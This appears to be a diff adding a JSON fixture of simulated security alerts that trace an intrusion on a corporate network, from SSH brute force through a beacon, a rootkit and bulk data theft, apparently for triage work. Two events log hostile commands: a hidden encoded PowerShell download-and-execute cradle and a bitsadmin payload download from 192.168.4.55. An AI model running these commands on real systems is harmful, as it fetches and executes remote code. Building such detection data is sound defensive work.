@@ -1,0 +1,160 @@
+{
+  "batch_id": "BATCH-2026-05-29-001",
+  "generated_at": "2026-05-29T08:14:32Z",
+  "source_environment": "internal-corp-tenant",
+  "data_provenance": "owned-by-tenant; no third-party traffic captured",
+  "events": [
+    {
+      "event_id": "EVT-0001",
+      "timestamp": "2026-05-29T07:42:11Z",
+      "source": "wazuh-manager-01",
+      "rule_id": "5712",
+      "rule_description": "SSHD brute force trying to get access to the system.",
+      "severity": 10,
+      "agent": {"id": "031", "name": "bastion-prod-01", "ip": "10.20.4.11"},
+      "data": {
+        "srcip": "10.20.99.42",
+        "srcuser": "root",
+        "attempts": 47,
+        "window_seconds": 60,
+        "auth_method": "password"
+      },
+      "asset_context": {
+        "asset_criticality": "high",
+        "exposed_to_internet": false,
+        "owner_team": "platform-sre"
+      }
+    },
+    {
+      "event_id": "EVT-0002",
+      "timestamp": "2026-05-29T07:43:55Z",
+      "source": "sysmon-edr",
+      "event_code": 1,
+      "rule_description": "Process create — encoded PowerShell from Office parent",
+      "severity": "high",
+      "host": {"hostname": "WS-FIN-014", "user": "CORP\\j.morales", "department": "finance"},
+      "data": {
+        "parent_image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQALgA1ADUALwBwAC4AcABzADEAJwApAA==",
+        "integrity_level": "Medium"
+      },
+      "asset_context": {
+        "asset_criticality": "medium",
+        "exposed_to_internet": false,
+        "owner_team": "finance-it"
+      }
+    },
+    {
+      "event_id": "EVT-0003",
+      "timestamp": "2026-05-29T07:51:02Z",
+      "source": "suricata-ids",
+      "rule_id": "ET MALWARE Possible Cobalt Strike Beacon Activity",
+      "sid": "2025543",
+      "severity": "critical",
+      "host": {"hostname": "WS-FIN-014", "ip": "10.20.7.114"},
+      "data": {
+        "src_ip": "10.20.7.114",
+        "dst_ip": "192.168.4.55",
+        "dst_port": 443,
+        "proto": "TCP",
+        "ja3": "a0e9f5d64349fb13191bc491f15daff7",
+        "http_uri": "/submit.php?id=8a3f",
+        "user_agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
+      },
+      "asset_context": {
+        "asset_criticality": "medium",
+        "exposed_to_internet": false,
+        "owner_team": "finance-it"
+      }
+    },
+    {
+      "event_id": "EVT-0004",
+      "timestamp": "2026-05-29T07:55:17Z",
+      "source": "office365-audit",
+      "operation": "UserLoggedIn",
+      "severity": "medium",
+      "user": {"upn": "j.morales@company.tld", "department": "finance"},
+      "data": {
+        "client_ip": "185.220.101.34",
+        "country": "RO",
+        "isp": "Tor exit node (heuristic)",
+        "previous_login_country": "CO",
+        "previous_login_at": "2026-05-29T07:12:00Z",
+        "geo_distance_km": 9842,
+        "minutes_since_previous": 43,
+        "impossible_travel": true,
+        "mfa_satisfied": false
+      },
+      "asset_context": {
+        "asset_criticality": "high",
+        "exposed_to_internet": true,
+        "owner_team": "identity"
+      }
+    },
+    {
+      "event_id": "EVT-0005",
+      "timestamp": "2026-05-29T07:58:44Z",
+      "source": "crowdstrike-falcon",
+      "detection_id": "ldt:abc123:def456",
+      "rule_description": "Living-off-the-land binary — bitsadmin used to download payload",
+      "severity": "high",
+      "host": {"hostname": "SRV-DB-PROD-02", "ip": "10.20.10.22"},
+      "data": {
+        "parent_image": "C:\\Windows\\System32\\cmd.exe",
+        "image": "C:\\Windows\\System32\\bitsadmin.exe",
+        "command_line": "bitsadmin /transfer myJob /download /priority normal http://192.168.4.55/loader.exe C:\\Windows\\Temp\\u.exe",
+        "user": "NT AUTHORITY\\SYSTEM"
+      },
+      "asset_context": {
+        "asset_criticality": "critical",
+        "exposed_to_internet": false,
+        "owner_team": "database-ops",
+        "data_classification": "PII + financial"
+      }
+    },
+    {
+      "event_id": "EVT-0006",
+      "timestamp": "2026-05-29T08:02:09Z",
+      "source": "wazuh-manager-01",
+      "rule_id": "100210",
+      "rule_description": "Rootkit fingerprint — modified /etc/ld.so.preload",
+      "severity": 14,
+      "agent": {"id": "047", "name": "SRV-DB-PROD-02", "ip": "10.20.10.22"},
+      "data": {
+        "file": "/etc/ld.so.preload",
+        "previous_md5": "d41d8cd98f00b204e9800998ecf8427e",
+        "current_md5": "f3b1aa2c0a93a76b2c8fe86f79a3b6c7",
+        "file_owner": "root",
+        "selinux_context": "system_u:object_r:ld_so_cache_t:s0"
+      },
+      "asset_context": {
+        "asset_criticality": "critical",
+        "exposed_to_internet": false,
+        "owner_team": "database-ops",
+        "data_classification": "PII + financial"
+      }
+    },
+    {
+      "event_id": "EVT-0007",
+      "timestamp": "2026-05-29T08:05:31Z",
+      "source": "office365-audit",
+      "operation": "FileDownloaded",
+      "severity": "medium",
+      "user": {"upn": "j.morales@company.tld", "department": "finance"},
+      "data": {
+        "site": "/sites/finance-archive",
+        "files_downloaded_60min": 312,
+        "total_bytes_60min": 2147483648,
+        "client_ip": "185.220.101.34",
+        "user_agent": "rclone/v1.65.0"
+      },
+      "asset_context": {
+        "asset_criticality": "high",
+        "exposed_to_internet": true,
+        "owner_team": "finance-it",
+        "data_classification": "internal financial records"
+      }
+    }
+  ]
+}
